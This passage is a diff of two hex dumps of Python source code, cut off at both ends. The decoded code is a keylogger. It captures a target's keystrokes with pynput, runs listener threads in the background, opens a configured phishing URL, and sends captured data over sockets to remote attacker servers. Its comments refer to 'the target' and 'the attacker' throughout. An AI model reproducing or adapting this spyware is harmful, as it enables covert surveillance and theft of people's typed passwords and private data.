-00002d00: 2e63 6170 735f 6c6f 636b 3a0d 0a20 2020  .caps_lock:..   
-00002d10: 2020 2020 2020 2020 2020 2020 2073 656c               sel
-00002d20: 662e 6361 7073 203d 2054 7275 650d 0a20  f.caps = True.. 
-00002d30: 2020 2020 2020 2020 2020 2020 2020 2073                 s
-00002d40: 656c 662e 6368 6563 6b2e 6170 7065 6e64  elf.check.append
-00002d50: 2831 290d 0a20 2020 2020 2020 2020 2020  (1)..           
-00002d60: 2063 6865 636b 5f63 6170 7320 3d20 7375   check_caps = su
-00002d70: 6d28 7365 6c66 2e63 6865 636b 2920 2f20  m(self.check) / 
-00002d80: 320d 0a20 2020 2020 2020 2020 2020 2023  2..            #
-00002d90: 2049 6620 6368 6563 6b5f 6361 7073 2069   If check_caps i
-00002da0: 7320 6e6f 7420 7072 696d 6172 7920 6974  s not primary it
-00002db0: 2077 696c 6c20 7365 7420 7365 6c66 2e63   will set self.c
-00002dc0: 6170 7320 746f 2046 616c 7365 0d0a 0d0a  aps to False....
-00002dd0: 2020 2020 2020 2020 2020 2020 6966 2073              if s
-00002de0: 7472 2863 6865 636b 5f63 6170 7329 5b2d  tr(check_caps)[-
-00002df0: 315d 2021 3d20 2730 273a 0d0a 2020 2020  1] != '0':..    
-00002e00: 2020 2020 2020 2020 2020 2020 7061 7373              pass
-00002e10: 0d0a 2020 2020 2020 2020 2020 2020 656c  ..            el
-00002e20: 7365 3a0d 0a20 2020 2020 2020 2020 2020  se:..           
-00002e30: 2020 2020 2073 656c 662e 6361 7073 203d       self.caps =
-00002e40: 2046 616c 7365 0d0a 2020 2020 2020 2020   False..        
-00002e50: 2020 2020 2020 2020 2320 5468 6973 2072          # This r
-00002e60: 6573 6574 7320 6576 6572 7974 6869 6e67  esets everything
-00002e70: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-00002e80: 6966 206b 6579 203d 3d20 6b65 7962 6f61  if key == keyboa
-00002e90: 7264 2e4b 6579 2e62 6163 6b73 7061 6365  rd.Key.backspace
-00002ea0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-00002eb0: 2020 2064 7420 3d20 6461 7465 7469 6d65     dt = datetime
-00002ec0: 2e6e 6f77 2829 0d0a 2020 2020 2020 2020  .now()..        
-00002ed0: 2020 2020 2020 2020 2320 4765 7473 2074          # Gets t
-00002ee0: 6865 2063 7572 7265 6e74 2074 696d 650d  he current time.
-00002ef0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002f00: 2067 6574 5f74 696d 6520 3d20 7374 7228   get_time = str(
-00002f10: 6474 292e 7370 6c69 7428 223a 2229 0d0a  dt).split(":")..
-00002f20: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002f30: 2320 5468 6973 2073 706c 6974 7320 7468  # This splits th
-00002f40: 6520 7469 6d65 2073 6f20 7468 6520 6d69  e time so the mi
-00002f50: 6e75 7465 7320 616e 6420 7365 636f 6e64  nutes and second
-00002f60: 7320 6172 6520 6469 7370 6c61 7965 640d  s are displayed.
-00002f70: 0a0d 0a20 2020 2020 2020 2020 2020 2020  ...             
-00002f80: 2020 2068 6f75 722c 206d 696e 7574 6573     hour, minutes
-00002f90: 2c20 7365 6320 3d20 696e 7428 6765 745f  , sec = int(get_
-00002fa0: 7469 6d65 5b30 5d5b 3a3a 2d31 5d5b 303a  time[0][::-1][0:
-00002fb0: 325d 5b3a 3a2d 315d 292c 2069 6e74 2867  2][::-1]), int(g
-00002fc0: 6574 5f74 696d 655b 315d 292c 2066 6c6f  et_time[1]), flo
-00002fd0: 6174 2867 6574 5f74 696d 655b 325d 290d  at(get_time[2]).
-00002fe0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002ff0: 2023 2047 6574 7320 7468 6520 6375 7272   # Gets the curr
-00003000: 656e 7420 686f 7572 2c20 6d69 6e75 7465  ent hour, minute
-00003010: 2061 6e64 2073 6563 6f6e 640d 0a0d 0a20   and second.... 
-00003020: 2020 2020 2020 2020 2020 2020 2020 2061                 a
-00003030: 6c6c 203d 2068 6f75 7220 2a20 3336 3030  ll = hour * 3600
-00003040: 202b 206d 696e 7574 6573 202a 2036 3020   + minutes * 60 
-00003050: 2b20 7365 630d 0a20 2020 2020 2020 2020  + sec..         
-00003060: 2020 2020 2020 2023 2047 6574 7320 7468         # Gets th
-00003070: 6520 7365 636f 6e64 7320 6f66 2065 7665  e seconds of eve
-00003080: 7279 7468 696e 6720 6672 6f6d 2068 6f75  rything from hou
-00003090: 7220 746f 2073 6563 6f6e 640d 0a20 2020  r to second..   
-000030a0: 2020 2020 2020 2020 2020 2020 2069 6620               if 
-000030b0: 6e6f 7420 7365 6c66 2e73 6563 6f6e 6473  not self.seconds
-000030c0: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-000030d0: 2020 2020 2020 2023 2049 6620 7468 6572         # If ther
-000030e0: 6520 6973 206e 6f74 6869 6e67 2069 6e20  e is nothing in 
-000030f0: 7468 6520 6c69 7374 2073 6563 6f6e 6420  the list second 
-00003100: 7769 6c6c 2062 6520 6170 7061 6e64 6564  will be appanded
-00003110: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00003120: 2020 2020 2020 7365 6c66 2e73 6563 6f6e        self.secon
-00003130: 6473 2e61 7070 656e 6428 616c 6c29 0d0a  ds.append(all)..
-00003140: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003150: 6d69 6e75 7320 3d20 616c 6c20 2d20 7365  minus = all - se
-00003160: 6c66 2e73 6563 6f6e 6473 5b30 5d0d 0a20  lf.seconds[0].. 
-00003170: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00003180: 2054 6869 7320 6368 6563 6b73 2069 6620   This checks if 
-00003190: 7468 6520 7461 7267 6574 2069 7320 686f  the target is ho
-000031a0: 6c64 696e 6720 7468 6520 6261 636b 7370  lding the backsp
-000031b0: 6163 6520 6b65 790d 0a20 2020 2020 2020  ace key..       
-000031c0: 2020 2020 2020 2020 2069 6620 6d69 6e75           if minu
-000031d0: 7320 3e20 302e 3035 206f 7220 6d69 6e75  s > 0.05 or minu
-000031e0: 7320 3d3d 2030 2e30 3a0d 0a20 2020 2020  s == 0.0:..     
-000031f0: 2020 2020 2020 2020 2020 2020 2020 2069                 i
-00003200: 6620 7365 6c66 2e72 6963 6874 6967 655f  f self.richtige_
-00003210: 6c69 7374 653a 0d0a 2020 2020 2020 2020  liste:..        
-00003220: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003230: 7365 6c66 2e72 6963 6874 6967 655f 6c69  self.richtige_li
-00003240: 7374 652e 706f 7028 2d31 290d 0a20 2020  ste.pop(-1)..   
-00003250: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003260: 2020 2020 2023 2052 656d 6f76 6573 2074       # Removes t
-00003270: 6865 206c 6173 7420 6974 656d 206f 6620  he last item of 
-00003280: 7468 6520 6c69 7374 0d0a 0d0a 2020 2020  the list....    
-00003290: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-000032a0: 2e73 6563 6f6e 6473 5b30 5d20 3d20 616c  .seconds[0] = al
-000032b0: 6c0d 0a20 2020 2020 2020 2020 2020 2020  l..             
-000032c0: 2020 2023 204c 6973 7420 7769 6c6c 2061     # List will a
-000032d0: 6c6c 7761 7973 2062 6520 7570 6461 7465  llways be update
-000032e0: 640d 0a0d 0a20 2020 2064 6566 206f 6e5f  d....    def on_
-000032f0: 7265 6c65 6173 6528 7365 6c66 2c20 6b65  release(self, ke
-00003300: 7929 3a0d 0a20 2020 2020 2020 2070 7269  y):..        pri
-00003310: 6e74 2866 274b 6579 2072 656c 6561 7365  nt(f'Key release
-00003320: 643a 207b 6b65 797d 2729 0d0a 0d0a 2020  d: {key}')....  
-00003330: 2020 4073 7461 7469 636d 6574 686f 640d    @staticmethod.
-00003340: 0a20 2020 2064 6566 2069 6e74 6572 6e65  .    def interne
-00003350: 745f 636f 6e6e 6563 7469 6f6e 2829 3a0d  t_connection():.
-00003360: 0a20 2020 2020 2020 2023 2054 6869 7320  .        # This 
-00003370: 6675 6e63 7469 6f6e 2063 6865 636b 7320  function checks 
-00003380: 6966 2061 2063 6f6e 6e65 6374 696f 6e20  if a connection 
-00003390: 6973 2073 7461 626c 650d 0a20 2020 2020  is stable..     
-000033a0: 2020 2077 6869 6c65 2054 7275 653a 0d0a     while True:..
-000033b0: 2020 2020 2020 2020 2020 2020 7472 793a              try:
-000033c0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000033d0: 2020 7265 7175 6573 7473 2e67 6574 2822    requests.get("
-000033e0: 6874 7470 733a 2f2f 7777 772e 676f 6f67  https://www.goog
-000033f0: 6c65 2e63 6f6d 2f22 290d 0a20 2020 2020  le.com/")..     
-00003400: 2020 2020 2020 2020 2020 2023 2047 6f6f             # Goo
-00003410: 676c 6520 6973 2061 6c77 6179 7320 6f6e  gle is always on
-00003420: 6c69 6e65 2073 6f20 4920 6368 6f73 6520  line so I chose 
-00003430: 676f 6f67 6c65 0d0a 2020 2020 2020 2020  google..        
-00003440: 2020 2020 2020 2020 6272 6561 6b0d 0a20          break.. 
-00003450: 2020 2020 2020 2020 2020 2020 2020 2023                 #
-00003460: 2049 6620 7468 6572 6520 6973 2061 6e20   If there is an 
-00003470: 696e 7465 726e 6574 2063 6f6e 6e65 6374  internet connect
-00003480: 696f 6e20 6974 2077 696c 6c20 7275 6e20  ion it will run 
-00003490: 6173 206e 6f72 6d61 6c0d 0a20 2020 2020  as normal..     
-000034a0: 2020 2020 2020 2065 7863 6570 7420 7265         except re
-000034b0: 7175 6573 7473 2e65 7863 6570 7469 6f6e  quests.exception
-000034c0: 732e 436f 6e6e 6563 7469 6f6e 4572 726f  s.ConnectionErro
-000034d0: 723a 0d0a 2020 2020 2020 2020 2020 2020  r:..            
-000034e0: 2020 2020 7072 696e 7428 224e 6f20 436f      print("No Co
-000034f0: 6e6e 6563 7469 6f6e 2229 0d0a 0d0a 2020  nnection")....  
-00003500: 2020 6465 6620 7374 6172 7428 7365 6c66    def start(self
-00003510: 293a 0d0a 2020 2020 2020 2020 7365 6c66  ):..        self
-00003520: 2e69 6e74 6572 6e65 745f 636f 6e6e 6563  .internet_connec
-00003530: 7469 6f6e 2829 0d0a 2020 2020 2020 2020  tion()..        
-00003540: 7469 6d65 2e73 6c65 6570 2831 290d 0a20  time.sleep(1).. 
-00003550: 2020 2020 2020 2023 204a 7573 7420 746f         # Just to
-00003560: 2063 6f6f 6c20 646f 776e 0d0a 0d0a 2020   cool down....  
-00003570: 2020 2020 2020 6966 2073 656c 662e 7068        if self.ph
-00003580: 6973 6869 6e67 2069 7320 6e6f 7420 4e6f  ishing is not No
-00003590: 6e65 3a0d 0a20 2020 2020 2020 2020 2020  ne:..           
-000035a0: 2074 7279 3a0d 0a20 2020 2020 2020 2020   try:..         
-000035b0: 2020 2020 2020 2072 6571 7565 7374 732e         requests.
-000035c0: 6765 7428 7365 6c66 2e70 6869 7368 696e  get(self.phishin
-000035d0: 6729 0d0a 2020 2020 2020 2020 2020 2020  g)..            
-000035e0: 2020 2020 2320 5265 7370 6f6e 6520 6973      # Respone is
-000035f0: 2068 6572 6520 746f 2073 6565 2069 6620   here to see if 
-00003600: 7468 6520 7765 6273 6974 6520 6973 206f  the website is o
-00003610: 6e6c 696e 6520 6f72 206e 6f74 0d0a 2020  nline or not..  
-00003620: 2020 2020 2020 2020 2020 2020 2020 7765                we
-00003630: 6262 726f 7773 6572 2e6f 7065 6e28 7365  bbrowser.open(se
-00003640: 6c66 2e70 6869 7368 696e 6729 0d0a 0d0a  lf.phishing)....
-00003650: 2020 2020 2020 2020 2020 2020 6578 6365              exce
-00003660: 7074 2072 6571 7565 7374 732e 6578 6365  pt requests.exce
-00003670: 7074 696f 6e73 2e43 6f6e 6e65 6374 696f  ptions.Connectio
-00003680: 6e45 7272 6f72 3a0d 0a20 2020 2020 2020  nError:..       
-00003690: 2020 2020 2020 2020 2070 7269 6e74 2822           print("
-000036a0: 4e6f 2063 6f6e 6e65 6374 696f 6e22 290d  No connection").
-000036b0: 0a0d 0a20 2020 2020 2020 2020 2020 2065  ...            e
-000036c0: 7863 6570 7420 7265 7175 6573 7473 2e65  xcept requests.e
-000036d0: 7863 6570 7469 6f6e 732e 496e 7661 6c69  xceptions.Invali
-000036e0: 6455 524c 3a0d 0a20 2020 2020 2020 2020  dURL:..         
-000036f0: 2020 2020 2020 2070 7269 6e74 2822 496e         print("In
-00003700: 7661 6c69 6420 5572 6c22 290d 0a0d 0a0d  valid Url").....
-00003710: 0a20 2020 2020 2020 206c 6973 7465 6e69  .        listeni
-00003720: 6e67 5f74 6872 6561 6420 3d20 7468 7265  ng_thread = thre
-00003730: 6164 696e 672e 5468 7265 6164 2874 6172  ading.Thread(tar
-00003740: 6765 743d 7365 6c66 2e64 6174 656e 5f61  get=self.daten_a
-00003750: 7566 6e65 6865 6d65 6e29 0d0a 2020 2020  ufnehemen)..    
-00003760: 2020 2020 2320 5468 6973 2072 756e 7320      # This runs 
-00003770: 7468 6520 7072 6f67 7261 6d20 6265 6869  the program behi
-00003780: 6e64 2074 6865 2061 6374 7561 6c20 7072  nd the actual pr
-00003790: 6f67 7261 6d6d 696e 670d 0a20 2020 2020  ogramming..     
-000037a0: 2020 206c 6973 7465 6e69 6e67 5f74 6872     listening_thr
-000037b0: 6561 642e 7374 6172 7428 290d 0a0d 0a20  ead.start().... 
-000037c0: 2020 2020 2020 2074 6872 6561 6469 6e67         threading
-000037d0: 5f6d 6f75 7365 203d 2074 6872 6561 6469  _mouse = threadi
-000037e0: 6e67 2e54 6872 6561 6428 7461 7267 6574  ng.Thread(target
-000037f0: 3d73 656c 662e 616c 6c5f 636c 6963 6b73  =self.all_clicks
-00003800: 290d 0a20 2020 2020 2020 2023 2054 6869  )..        # Thi
-00003810: 7320 7275 6e73 2074 6865 2070 726f 6772  s runs the progr
-00003820: 6d6d 2062 6568 696e 6420 7468 6520 6163  mm behind the ac
-00003830: 7475 616c 2070 726f 6772 616d 6d69 6e67  tual programming
-00003840: 0d0a 2020 2020 2020 2020 7468 7265 6164  ..        thread
-00003850: 696e 675f 6d6f 7573 652e 7374 6172 7428  ing_mouse.start(
-00003860: 290d 0a20 2020 2020 2020 2023 2049 6620  )..        # If 
-00003870: 7468 6520 7365 7276 6572 2069 7320 7468  the server is th
-00003880: 6520 646f 776e 2069 7420 7769 6c6c 2073  e down it will s
-00003890: 746f 7265 2074 6865 2064 6174 6120 6c6f  tore the data lo
-000038a0: 6361 6c6c 7920 616e 6420 7761 6974 2075  cally and wait u
-000038b0: 6e74 696c 2074 6865 2073 6572 7665 7220  ntil the server 
-000038c0: 6973 2061 7661 696c 6162 6c65 2061 6761  is available aga
-000038d0: 696e 2e0d 0a20 2020 2020 2020 2077 6869  in...        whi
-000038e0: 6c65 2054 7275 653a 0d0a 2020 2020 2020  le True:..      
-000038f0: 2020 2020 2020 7472 793a 0d0a 2020 2020        try:..    
-00003900: 2020 2020 2020 2020 2020 2020 7365 6e64              send
-00003910: 5f74 696d 6572 203d 2073 6f63 6b65 742e  _timer = socket.
-00003920: 736f 636b 6574 2873 6f63 6b65 742e 4146  socket(socket.AF
-00003930: 5f49 4e45 542c 2073 6f63 6b65 742e 534f  _INET, socket.SO
-00003940: 434b 5f53 5452 4541 4d29 0d0a 2020 2020  CK_STREAM)..    
-00003950: 2020 2020 2020 2020 2020 2020 7365 6e64              send
-00003960: 5f74 696d 6572 2e63 6f6e 6e65 6374 2828  _timer.connect((
-00003970: 7365 6c66 2e69 705f 7469 6d65 722c 2073  self.ip_timer, s
-00003980: 656c 662e 706f 7274 5f74 696d 6572 2929  elf.port_timer))
-00003990: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
-000039a0: 2020 2020 7365 6e64 5f74 696d 6572 2e73      send_timer.s
-000039b0: 656e 6428 7374 7228 7365 6c66 2e64 7572  end(str(self.dur
-000039c0: 6174 696f 6e29 2e65 6e63 6f64 6528 2929  ation).encode())
-000039d0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-000039e0: 2020 2320 5468 6973 2073 656e 6473 2074    # This sends t
-000039f0: 6865 2073 6563 6f6e 6473 2074 6f20 7468  he seconds to th
-00003a00: 6520 7365 7276 6572 0d0a 2020 2020 2020  e server..      
-00003a10: 2020 2020 2020 2020 2020 7365 6e64 5f74            send_t
-00003a20: 696d 6572 2e63 6c6f 7365 2829 0d0a 2020  imer.close()..  
-00003a30: 2020 2020 2020 2020 2020 2020 2020 6272                br
-00003a40: 6561 6b0d 0a0d 0a20 2020 2020 2020 2020  eak....         
-00003a50: 2020 2065 7863 6570 743a 0d0a 2020 2020     except:..    
-00003a60: 2020 2020 2020 2020 2020 2020 636f 6e74              cont
-00003a70: 696e 7565 0d0a 0d0a 0d0a 2020 2020 2020  inue......      
-00003a80: 2020 7769 7468 206b 6579 626f 6172 642e    with keyboard.
-00003a90: 4c69 7374 656e 6572 286f 6e5f 7072 6573  Listener(on_pres
-00003aa0: 733d 7365 6c66 2e6f 6e5f 7072 6573 732c  s=self.on_press,
-00003ab0: 206f 6e5f 7265 6c65 6173 653d 7365 6c66   on_release=self
-00003ac0: 2e6f 6e5f 7265 6c65 6173 6529 2061 7320  .on_release) as 
-00003ad0: 6c69 7374 656e 6572 3a0d 0a20 2020 2020  listener:..     
-00003ae0: 2020 2020 2020 2073 656c 662e 636f 756e         self.coun
-00003af0: 7464 6f77 6e5f 7365 6e64 2873 656c 662e  tdown_send(self.
-00003b00: 6475 7261 7469 6f6e 2c20 7365 6c66 2e69  duration, self.i
-00003b10: 705f 7068 6f74 6f73 2c20 7365 6c66 2e70  p_photos, self.p
-00003b20: 6f72 745f 7068 6f74 6f73 2c20 7365 6c66  ort_photos, self
-00003b30: 2e69 705f 6b65 796c 6f67 6765 722c 0d0a  .ip_keylogger,..
-00003b40: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003b50: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003b60: 7365 6c66 2e70 6f72 745f 6b65 796c 6f67  self.port_keylog
-00003b70: 6765 7229 0d0a 2020 2020 2020 2020 2020  ger)..          
-00003b80: 2020 6c69 7374 656e 6572 2e6a 6f69 6e28    listener.join(
-00003b90: 290d 0a20 2020 2020 2020 2020 2020 2023  )..            #
-00003ba0: 2054 6869 7320 6c69 7374 656e 7320 746f   This listens to
-00003bb0: 2074 6865 206b 6579 7320 7468 6174 2077   the keys that w
-00003bc0: 6865 7265 2074 790d 0a                   here ty..
+000029b0: 2020 6966 2061 7363 695f 6e75 6d62 6572    if asci_number
+000029c0: 206e 6f74 2069 6e20 7261 6e67 6528 302c   not in range(0,
+000029d0: 2033 3229 3a0d 0a20 2020 2020 2020 2020   32):..         
+000029e0: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+000029f0: 2069 6620 7468 6572 6520 6973 206e 6f20   if there is no 
+00002a00: 7370 6563 6961 6c20 6368 6172 6163 7465  special characte
+00002a10: 7220 6974 206a 7573 7420 7072 696e 7473  r it just prints
+00002a20: 2074 6865 2061 6c70 6861 6265 7469 6320   the alphabetic 
+00002a30: 6e75 6d62 6572 0d0a 2020 2020 2020 2020  number..        
+00002a40: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00002a50: 7365 6c66 2e70 7269 6e74 5f77 6f72 6b28  self.print_work(
+00002a60: 7365 6c66 2e77 6f72 6429 0d0a 0d0a 2020  self.word)....  
+00002a70: 2020 2020 2020 2020 2020 2020 2020 6578                ex
+00002a80: 6365 7074 2054 7970 6545 7272 6f72 3a0d  cept TypeError:.
+00002a90: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002aa0: 2020 2020 2023 2070 7269 6e74 7320 7468       # prints th
+00002ab0: 6520 616c 7068 6162 6574 6320 6e75 6d62  e alphabetc numb
+00002ac0: 6572 0d0a 2020 2020 2020 2020 2020 2020  er..            
+00002ad0: 2020 2020 2020 2020 7365 6c66 2e70 7269          self.pri
+00002ae0: 6e74 5f77 6f72 6b28 7365 6c66 2e77 6f72  nt_work(self.wor
+00002af0: 6429 0d0a 0d0a 2020 2020 2020 2020 2020  d)....          
+00002b00: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
+00002b10: 2e72 6963 6874 6967 655f 6c69 7374 6529  .richtige_liste)
+00002b20: 0d0a 2020 2020 2020 2020 2020 2020 6578  ..            ex
+00002b30: 6365 7074 2054 7970 6545 7272 6f72 3a0d  cept TypeError:.
+00002b40: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002b50: 2070 6173 730d 0a0d 0a20 2020 2020 2020   pass....       
+00002b60: 2065 7863 6570 7420 4174 7472 6962 7574   except Attribut
+00002b70: 6545 7272 6f72 3a0d 0a20 2020 2020 2020  eError:..       
+00002b80: 2020 2020 2070 7269 6e74 2866 2741 6e20       print(f'An 
+00002b90: 6f74 6865 7220 6b65 7920 7761 7320 7072  other key was pr
+00002ba0: 6573 7365 643a 207b 6b65 797d 2729 0d0a  essed: {key}')..
+00002bb0: 2020 2020 2020 2020 2020 2020 6966 206b              if k
+00002bc0: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
+00002bd0: 6579 2e74 6162 3a0d 0a20 2020 2020 2020  ey.tab:..       
+00002be0: 2020 2020 2020 2020 2073 656c 662e 7269           self.ri
+00002bf0: 6368 7469 6765 5f6c 6973 7465 202b 3d20  chtige_liste += 
+00002c00: 2220 5b54 4142 5d20 220d 0a0d 0a20 2020  " [TAB] "....   
+00002c10: 2020 2020 2020 2020 2065 6c69 6620 6b65           elif ke
+00002c20: 7920 3d3d 206b 6579 626f 6172 642e 4b65  y == keyboard.Ke
+00002c30: 792e 656e 7465 723a 0d0a 2020 2020 2020  y.enter:..      
+00002c40: 2020 2020 2020 2020 2020 7365 6c66 2e72            self.r
+00002c50: 6963 6874 6967 655f 6c69 7374 6520 2b3d  ichtige_liste +=
+00002c60: 2022 205b 454e 5445 525d 2022 0d0a 0d0a   " [ENTER] "....
+00002c70: 2020 2020 2020 2020 2020 2020 656c 6966              elif
+00002c80: 206b 6579 203d 3d20 6b65 7962 6f61 7264   key == keyboard
+00002c90: 2e4b 6579 2e73 7061 6365 3a0d 0a20 2020  .Key.space:..   
+00002ca0: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+00002cb0: 662e 7269 6368 7469 6765 5f6c 6973 7465  f.richtige_liste
+00002cc0: 202b 3d20 227b 220d 0a20 2020 2020 2020   += "{"..       
+00002cd0: 2020 2020 2020 2020 2023 2049 6620 7468           # If th
+00002ce0: 6520 7461 7267 6574 2070 7265 7373 6573  e target presses
+00002cf0: 2074 6162 206f 7220 7370 6163 6520 6120   tab or space a 
+00002d00: 227b 2220 7769 6c6c 2062 6520 6170 7065  "{" will be appe
+00002d10: 6e64 6564 2074 6f20 7468 6520 6c69 7374  nded to the list
+00002d20: 2073 6f20 7468 6520 6174 7461 636b 6572   so the attacker
+00002d30: 206b 6e6f 7773 2077 6865 6e20 616e 640d   knows when and.
+00002d40: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002d50: 2023 2073 7061 6365 206f 7220 6120 7461   # space or a ta
+00002d60: 6220 6b65 7920 6861 7320 6265 656e 2070  b key has been p
+00002d70: 7265 7373 6564 0d0a 2020 2020 2020 2020  ressed..        
+00002d80: 2020 2020 656c 6966 206b 6579 203d 3d20      elif key == 
+00002d90: 6b65 7962 6f61 7264 2e4b 6579 2e63 6170  keyboard.Key.cap
+00002da0: 735f 6c6f 636b 3a0d 0a20 2020 2020 2020  s_lock:..       
+00002db0: 2020 2020 2020 2020 2073 656c 662e 6361           self.ca
+00002dc0: 7073 203d 2054 7275 650d 0a20 2020 2020  ps = True..     
+00002dd0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002de0: 6368 6563 6b2e 6170 7065 6e64 2831 290d  check.append(1).
+00002df0: 0a20 2020 2020 2020 2020 2020 2063 6865  .            che
+00002e00: 636b 5f63 6170 7320 3d20 7375 6d28 7365  ck_caps = sum(se
+00002e10: 6c66 2e63 6865 636b 2920 2f20 320d 0a20  lf.check) / 2.. 
+00002e20: 2020 2020 2020 2020 2020 2023 2049 6620             # If 
+00002e30: 6368 6563 6b5f 6361 7073 2069 7320 6e6f  check_caps is no
+00002e40: 7420 7072 696d 6172 7920 6974 2077 696c  t primary it wil
+00002e50: 6c20 7365 7420 7365 6c66 2e63 6170 7320  l set self.caps 
+00002e60: 746f 2046 616c 7365 0d0a 0d0a 2020 2020  to False....    
+00002e70: 2020 2020 2020 2020 6966 2073 7472 2863          if str(c
+00002e80: 6865 636b 5f63 6170 7329 5b2d 315d 2021  heck_caps)[-1] !
+00002e90: 3d20 2730 273a 0d0a 2020 2020 2020 2020  = '0':..        
+00002ea0: 2020 2020 2020 2020 7061 7373 0d0a 2020          pass..  
+00002eb0: 2020 2020 2020 2020 2020 656c 7365 3a0d            else:.
+00002ec0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00002ed0: 2073 656c 662e 6361 7073 203d 2046 616c   self.caps = Fal
+00002ee0: 7365 0d0a 2020 2020 2020 2020 2020 2020  se..            
+00002ef0: 2020 2020 2320 5468 6973 2072 6573 6574      # This reset
+00002f00: 7320 6576 6572 7974 6869 6e67 0d0a 0d0a  s everything....
+00002f10: 2020 2020 2020 2020 2020 2020 6966 206b              if k
+00002f20: 6579 203d 3d20 6b65 7962 6f61 7264 2e4b  ey == keyboard.K
+00002f30: 6579 2e62 6163 6b73 7061 6365 3a0d 0a20  ey.backspace:.. 
+00002f40: 2020 2020 2020 2020 2020 2020 2020 2064                 d
+00002f50: 7420 3d20 6461 7465 7469 6d65 2e6e 6f77  t = datetime.now
+00002f60: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
+00002f70: 2020 2020 2320 4765 7473 2074 6865 2063      # Gets the c
+00002f80: 7572 7265 6e74 2074 696d 650d 0a20 2020  urrent time..   
+00002f90: 2020 2020 2020 2020 2020 2020 2067 6574               get
+00002fa0: 5f74 696d 6520 3d20 7374 7228 6474 292e  _time = str(dt).
+00002fb0: 7370 6c69 7428 223a 2229 0d0a 2020 2020  split(":")..    
+00002fc0: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
+00002fd0: 6973 2073 706c 6974 7320 7468 6520 7469  is splits the ti
+00002fe0: 6d65 2073 6f20 7468 6520 6d69 6e75 7465  me so the minute
+00002ff0: 7320 616e 6420 7365 636f 6e64 7320 6172  s and seconds ar
+00003000: 6520 6469 7370 6c61 7965 640d 0a0d 0a20  e displayed.... 
+00003010: 2020 2020 2020 2020 2020 2020 2020 2068                 h
+00003020: 6f75 722c 206d 696e 7574 6573 2c20 7365  our, minutes, se
+00003030: 6320 3d20 696e 7428 6765 745f 7469 6d65  c = int(get_time
+00003040: 5b30 5d5b 3a3a 2d31 5d5b 303a 325d 5b3a  [0][::-1][0:2][:
+00003050: 3a2d 315d 292c 2069 6e74 2867 6574 5f74  :-1]), int(get_t
+00003060: 696d 655b 315d 292c 2066 6c6f 6174 2867  ime[1]), float(g
+00003070: 6574 5f74 696d 655b 325d 290d 0a20 2020  et_time[2])..   
+00003080: 2020 2020 2020 2020 2020 2020 2023 2047               # G
+00003090: 6574 7320 7468 6520 6375 7272 656e 7420  ets the current 
+000030a0: 686f 7572 2c20 6d69 6e75 7465 2061 6e64  hour, minute and
+000030b0: 2073 6563 6f6e 640d 0a0d 0a20 2020 2020   second....     
+000030c0: 2020 2020 2020 2020 2020 2061 6c6c 203d             all =
+000030d0: 2068 6f75 7220 2a20 3336 3030 202b 206d   hour * 3600 + m
+000030e0: 696e 7574 6573 202a 2036 3020 2b20 7365  inutes * 60 + se
+000030f0: 630d 0a20 2020 2020 2020 2020 2020 2020  c..             
+00003100: 2020 2023 2047 6574 7320 7468 6520 7365     # Gets the se
+00003110: 636f 6e64 7320 6f66 2065 7665 7279 7468  conds of everyth
+00003120: 696e 6720 6672 6f6d 2068 6f75 7220 746f  ing from hour to
+00003130: 2073 6563 6f6e 640d 0a20 2020 2020 2020   second..       
+00003140: 2020 2020 2020 2020 2069 6620 6e6f 7420           if not 
+00003150: 7365 6c66 2e73 6563 6f6e 6473 3a0d 0a20  self.seconds:.. 
+00003160: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003170: 2020 2023 2049 6620 7468 6572 6520 6973     # If there is
+00003180: 206e 6f74 6869 6e67 2069 6e20 7468 6520   nothing in the 
+00003190: 6c69 7374 2073 6563 6f6e 6420 7769 6c6c  list second will
+000031a0: 2062 6520 6170 7061 6e64 6564 0d0a 2020   be appanded..  
+000031b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000031c0: 2020 7365 6c66 2e73 6563 6f6e 6473 2e61    self.seconds.a
+000031d0: 7070 656e 6428 616c 6c29 0d0a 2020 2020  ppend(all)..    
+000031e0: 2020 2020 2020 2020 2020 2020 6d69 6e75              minu
+000031f0: 7320 3d20 616c 6c20 2d20 7365 6c66 2e73  s = all - self.s
+00003200: 6563 6f6e 6473 5b30 5d0d 0a20 2020 2020  econds[0]..     
+00003210: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
+00003220: 7320 6368 6563 6b73 2069 6620 7468 6520  s checks if the 
+00003230: 7461 7267 6574 2069 7320 686f 6c64 696e  target is holdin
+00003240: 6720 7468 6520 6261 636b 7370 6163 6520  g the backspace 
+00003250: 6b65 790d 0a20 2020 2020 2020 2020 2020  key..           
+00003260: 2020 2020 2069 6620 6d69 6e75 7320 3e20       if minus > 
+00003270: 302e 3035 206f 7220 6d69 6e75 7320 3d3d  0.05 or minus ==
+00003280: 2030 2e30 3a0d 0a20 2020 2020 2020 2020   0.0:..         
